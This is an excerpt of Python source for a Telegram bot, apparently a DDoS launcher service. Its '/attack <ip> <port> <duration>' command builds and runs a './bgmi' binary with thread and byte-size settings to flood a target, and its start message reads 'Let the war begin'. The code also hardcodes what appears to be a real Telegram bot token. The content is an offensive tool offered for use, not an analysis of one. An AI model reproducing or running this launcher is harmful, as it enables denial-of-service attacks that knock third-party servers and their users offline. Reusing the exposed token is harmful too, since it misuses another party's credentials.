...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7956789514:AAGxj-xIj_wfkYMX-qniQOewRtyLKcMWXko'
...
async def start(update: Update, context: CallbackContext):
    ...
    message = (
        ...
        "*Let the war begin! ⚔️💥 MADE BY @RAJOWNER90*"
    )
...
async def attack(update: Update, context: CallbackContext):
    ...
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>* MADE BY @RAJOWNER90", parse_mode='Markdown')
        return
    ...
    if argument_type == 3:
        attack_command = f"./bgmi {ip} {port} {duration} 1200"
    elif argument_type == 4:
        attack_command = f"./bgmi {ip} {port} {duration} {threads} 1200"
    elif argument_type == 5:
        attack_command = f"./bgmi {ip} {port} {duration} {byte_size} {threads} 1200"
